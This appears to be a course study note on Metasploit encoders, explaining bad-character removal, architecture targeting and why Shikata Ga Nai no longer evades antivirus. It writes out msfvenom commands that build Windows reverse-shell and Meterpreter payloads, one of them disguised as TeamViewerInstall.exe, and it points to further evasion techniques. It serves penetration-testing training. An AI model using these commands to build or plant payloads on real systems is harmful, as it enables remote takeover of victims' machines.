# THEORY — Encoders

## ID
606

## Module
Using the Metasploit Framework

## Kind
theory

## Title
Section 7 — Encoders

## Description
What encoders do (architecture compatibility + bad-character removal), why Shikata Ga Nai's AV-evasion mystique is dead, and how `msfvenom` replaced the old `msfpayload | msfencode` pipeline.

## Tags
metasploit, encoders, msfvenom, shikata-ga-nai, av-evasion, bad-characters, virustotal

## Commands
- `show encoders`
- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ip> LPORT=4444 -b "\x00" -f perl`
- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ip> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`
- `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe`
- `msf-virustotal -k <API key> -f <file>`

## TL;DR — What's Important
- Encoders fix two real problems: architecture compatibility (x64/x86/sparc/ppc/mips) and **bad characters** that break shellcode (`-b "\x00..."`).
- They are **not** reliable AV bypass anymore. Modern AVs catch SGN even after 10 iterations.
- `msfvenom` replaces the old `msfpayload | msfencode` pipe — generation + encoding in one tool.

## What This Section Covers
Encoders rewrite payload bytes so they (a) run on the target architecture and (b) avoid forbidden bytes the vulnerable service strips or splits on. They were also historically the main AV-evasion mechanism; that ship has sailed.

## Common Architectures
`x64`, `x86`, `sparc`, `ppc`, `mips`

## Shikata Ga Nai (SGN)
仕方がない — "it cannot be helped." Polymorphic XOR additive feedback encoder. Was the gold standard pre-2015. The polymorphism shuffles XOR keys/instructions on each iteration, but modern AV/heuristics catch it anyway. Iterating SGN 10 times still typically results in detection.

## msfpayload | msfencode → msfvenom
Legacy (pre-2015):
```
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
Modern (single tool):
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

## Key msfvenom Flags (for encoding)
| Flag | Purpose |
|------|---------|
| `-a x86` | Target architecture |
| `--platform windows` | Target platform |
| `-p <payload>` | Payload to generate |
| `-b "\x00"` | Forbidden / bad characters to avoid |
| `-f <fmt>` | Output format (perl, c, exe, raw, aspx, etc.) |
| `-e <encoder>` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i <count>` | Iterations of encoding to apply |
| `-o <path>` | Output file |

## Listing Compatible Encoders
Inside an exploit module after selecting a payload:
```
show encoders
```
Output is filtered to encoders compatible with the current payload's arch — e.g. an x64 Meterpreter only lists `x64/xor`, `x64/xor_dynamic`, `x64/zutto_dekiru`, plus the generic ones.

## Reality Check — VirusTotal
| Test | Hit Rate |
|------|----------|
| `msfvenom -e x86/shikata_ga_nai` once on `TeamViewerInstall.exe` | 54/69 detect as malicious |
| `msfvenom -e x86/shikata_ga_nai -i 10` (10 iterations) | 52/65 — barely better |

Heuristic analysis, ML, and deep packet inspection killed the "encode it 10x and you're invisible" trick years ago.

## Self-Service VirusTotal Check
```
msf-virustotal -k <API key> -f <file>
```
Free API key required.

## Key Takeaways
- Use encoders for **bad-character avoidance and arch compatibility**, not as your AV-bypass strategy.
- Detection rates after SGN are still ~80%+ on a basic Meterpreter payload — plan on a different evasion technique (custom templates, packers, custom shellcode) for any AV-equipped target.
- `msfvenom` is the one tool — stop reaching for `msfpayload`/`msfencode`.

## Gotchas
- Encoding a payload doesn't make it smaller — each SGN iteration **adds** ~27 bytes. If your exploit has a tight size budget, encoding can blow it.
- Some exploit modules don't accept arbitrary encoded payloads — `show encoders` is the compatibility filter, trust it.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[06-payloads]] | [[08-databases]] →
<!-- AUTO-LINKS-END -->
